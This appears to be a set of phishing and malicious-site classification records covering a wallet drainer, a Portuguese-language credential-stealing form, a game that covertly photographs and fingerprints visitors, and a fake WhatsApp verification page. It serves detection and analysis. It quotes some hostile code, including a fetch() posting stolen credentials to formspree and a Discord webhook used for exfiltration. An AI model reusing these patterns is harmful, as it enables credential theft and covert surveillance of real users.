label: rectifyesvalidation.vercel.app

reasons: The page is a wallet drainer disguised as an 'AI protocol' for fixing wallet issues; its 'AI Functions' (Validation, Assets Recovery, etc.) all redirect to a hidden '/connect/index.html' page, which is a common pattern for draining wallets after connection.
The page disables right-click and keyboard shortcuts (F12, Ctrl+U) to prevent inspection, a strong indicator of hiding malicious activity from users.
The page uses deceptive copy like 'Restore your Account' and 'Assets Recovery' to lure users into connecting their wallets, then likely leads to a malicious signing interface.

label: verificado8891.github.io/seucertificadodoinsta.com

reasons: The page contains a form asking for a username ("Nome de usuário") and password ("Senha") and then sends the data via JavaScript to a third-party host: `fetch("https://formspree.io/f/xjybqrll", { method: "POST", body: formData })`

The page's own visible copy explicitly claims "Esta página é 100% segura. Nenhuma informação digitada é enviada ou armazenada" (This page is 100% secure. No typed information is sent or stored), which is directly contradicted by the exfiltration to Formspree in the page source.
The form collects generic login credentials (username and password) without providing any context of a legitimate service, a pattern typical of credential phishing.

label: itsbleak.github.io/coin-fall
title: Coin Catch Game
reasons: The page captures a camera photo of the visitor via getUserMedia and sends it to a hardcoded Discord webhook (discord.com/api/webhooks/1541052570653687838/...) along with IP address, user agent, screen dimensions, device memory, hardware concurrency, timezone, and network info — all posted as a 'New Player Data Captured' message with the photo attached.

The code explicitly exfiltrates IP and full browser fingerprint even when camera access is denied: `getClientInfo()` runs unconditionally at page load, with a comment reading 'SEND IP INFO IN CASE OF CAM PERMS DENIAL', sending data to the same Discord webhook without the visitor's knowledge.

Camera access is solicited under a false pretext — the game functions without it (player auto-moves in 'preview mode'), so the camera capture serves no gameplay purpose; it exists solely to photograph the visitor and transmit the image to the operator.

label: whatsapp-verify-zeta.vercel.app
title: WhatsApp - توثيق الحساب
reasons: The page impersonates WhatsApp with the title 'WhatsApp - توثيق الحساب' and WhatsApp logo, claiming to offer account verification for a blue checkmark, which is a false service WhatsApp does not provide through third-party websites.

It collects a phone number under the false pretext of WhatsApp verification, with the page explicitly stating 'أدخل رقم هاتفك للتحقق من هويتك' (enter your phone number to verify your identity) and promises a blue checkmark after verification.

The page uses a fake OTP verification flow where the OTP is generated client-side ('correctOtp = Math.floor(100000 + Math.random() * 900000).toString()') and verified locally, not actually sent by WhatsApp, deceiving visitors into entering information under false pretenses.
